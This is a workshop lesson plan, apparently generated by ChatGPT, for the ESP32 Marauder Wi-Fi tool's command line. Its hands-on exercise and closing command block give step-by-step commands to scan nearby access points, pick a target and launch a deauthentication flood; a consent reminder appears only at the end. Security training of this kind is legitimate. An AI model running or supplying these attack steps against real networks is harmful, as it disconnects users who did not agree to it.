## 1. Introduction to the CLI (5 min)

- What is the **ESP32 Marauder CLI** and why use it?
    
- Major command groups: **Wi‑Fi scanning**, **Sniffing**, **Attacks**, **Admin** [GitHub](https://github.com/justcallmekoko/ESP32Marauder/wiki/cli?utm_source=chatgpt.com)
    
- Connect via USB‑UART at **115200 baud**, using screen, Putty, Termux, etc. Then type `help` to list commands [GitHub+1](https://github.com/justcallmekoko/ESP32Marauder/wiki/cli?utm_source=chatgpt.com).
    

---

## 2. Core CLI Commands Overview (5 min)

|Category|Commands|
|---|---|
|**Admin**|`reboot`|
|**Wi‑Fi Scanning**|`scanap`, `scansta`, `stopscan`|
|**Sniffing**|`sniffbeacon`, `sniffdeauth`, `sniffpmkid`|
|**Wi‑Fi Attack**|`attack -t deauth`|
|**Aux Commands**|`channel`, `clearap`, `listap`, `select`|


---

## 3. Live Demo CLI Walkthrough (7 min)

Simulate a full session (typed):

`> scanap 1 -- lists APs -- > listap > select ap 0 > attack -t deauth > stopscan`

Explain how to change channel: `channel 6`.

Show how to stop sniffing: `stopscan`. Then `reboot` to finish.

---

## 4. Hands‑On Exercise (10 min)

### 🔧 Task: Perform an AP scan and targeted deauth

**Step 1:** Connect via serial interface (screen `/dev/ttyUSB0 115200`).

**Step 2:**

nginx

CopyEdit

`scanap 6 listap select ap 0 attack -t deauth`

Observe results and logs.

**Step 3:** Stop:

nginx

CopyEdit

`stopscan reboot`

### 📊 Learning Objectives:

- Discover visible Wi‑Fi APs
    
- Choose a target
    
- Launch a deauth flood
    
- Safely stop scanning
    

---

## 5. Advanced Topics/Q&A (5 min)

- Filtering targets via `select ssid -f 'Guest'`
    
- Use `clearap -a` to reset target lists
    
- Explain `sniffpmkid` for specific attack types
    
- Firmware capabilities updates (v1.7.0 adds TCP port scan, join Wi‑Fi) [Reddit+3smol.p1x.in+3GitHub+3](https://smol.p1x.in/flipperzero/marauder_scripting_ref.html?utm_source=chatgpt.com)[Flipper Lab](https://lab.flipper.net/apps/esp32_wifi_marauder?utm_source=chatgpt.com)[GitHub+2GitHub+2](https://github.com/justcallmekoko/ESP32Marauder/wiki/cli?utm_source=chatgpt.com)[New Releases](https://newreleases.io/project/github/justcallmekoko/ESP32Marauder/release/v1.7.0?utm_source=chatgpt.com)
    

---

## 🧩 Summary

You now know:

- How to connect and list CLI commands
    
- How to perform basic scanning and deauth attacks
    
- How to safely stop operations and reboot
    

---

## 📝 Pro Tips & Community Quotes

> “plug in your flipper zero … use: `screen /dev/[device] 115200` that should get you in” [smol.p1x.in+1](https://smol.p1x.in/flipperzero/marauder_scripting_ref.html?utm_source=chatgpt.com)[Reddit](https://www.reddit.com/r/flipperzero/comments/10h5nde/macos_ventura_wifi_dev_board_how_to_access/?utm_source=chatgpt.com)

> “commands guide : ... interact ... via serial monitoring” [Reddit](https://www.reddit.com/r/esp32/comments/19d8rfp/is_it_possible_to_make_esp32_marauder_work_in_an/?utm_source=chatgpt.com)

---

## ✅ Wrap‑Up & Next Steps

- Encourage reviewing the full CLI list for additional commands.
    
- Next advanced exercise: build a **JSON workflow script** using scan/deauth stages (see Smol reference) [smol.p1x.in](https://smol.p1x.in/flipperzero/marauder_scripting_ref.html?utm_source=chatgpt.com).
    
- Always test responsibly and only on networks you own or have consent for.
    

### **Exercise: AP Scan and Deauth via CLI**

bash

CopyEdit

`# Step 1: Start AP Scan scanap 6`

bash

CopyEdit

`# Step 2: List discovered access points listap`

bash

CopyEdit

`# Step 3: Select the first AP in the list (index 0) select ap 0`

bash

CopyEdit

`# Step 4: Launch a deauthentication attack on selected AP attack -t deauth`

bash

CopyEdit

`# Step 5: Stop scanning or attack if needed stopscan`

bash

CopyEdit

`# Step 6: Reboot device when done reboot`